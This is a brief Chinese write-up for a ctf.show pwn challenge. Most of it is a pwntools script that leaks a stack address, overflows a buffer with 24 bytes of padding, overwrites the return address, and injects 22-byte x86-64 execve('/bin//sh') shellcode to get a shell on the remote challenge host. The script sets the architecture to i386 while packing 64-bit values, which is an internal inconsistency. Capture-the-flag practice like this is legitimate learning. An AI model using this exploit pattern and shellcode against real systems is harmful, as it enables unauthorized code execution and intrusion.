# 挑战简介
又短了一点

# 思路
只能读取23个字节，而前面的题目shellcode都是22字节，所以足够了

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='i386', log_level='debug')

p = remote("pwn.challenge.ctf.show",28196)
elf = ELF('D:\edge 下载\pwn')
    
shellcode =b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

p.recvuntil("What's this : [")
	
v5=int(p.recv(14),16)

print("v5:",hex(v5))

p.recvuntil("But how to use it?\n")

payload = b"a" * 24 + p64(v5 + 32) + shellcode

p.sendline(payload)

p.interactive()

```
